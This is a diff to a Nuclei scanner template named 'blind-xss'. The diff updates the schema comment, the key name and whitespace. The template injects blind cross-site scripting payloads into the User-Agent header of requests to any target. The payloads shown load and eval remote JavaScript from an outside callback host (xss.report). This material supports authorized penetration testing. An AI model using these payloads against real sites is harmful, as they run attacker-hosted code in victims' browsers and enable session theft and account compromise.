@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: blind-xss
 
 info:
@@ -7,13 +8,13 @@ info:
   description: This template will spray blind XSS payloads into URLs. Use xss.report to check if the payload fired.
   tags: xss,blind,generic
 
-requests:
+http:
   - raw:
-      - | 
+      - |
         GET {{BaseURL}} HTTP/1.1
         Host: {{Hostname}}
         User-Agent: {{injection}}
-      
+
 
     payloads:
       injection:
@@ -26,5 +27,3 @@ requests:
       - '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/s/shelled");a.send();</script>'
       - '<script>$.getScript("//xss.report/s/shelled")</script>'
       - 'var a=document.createElement("script");a.src="//xss.report/s/shelled";document.body.appendChild(a);'
-      
-      
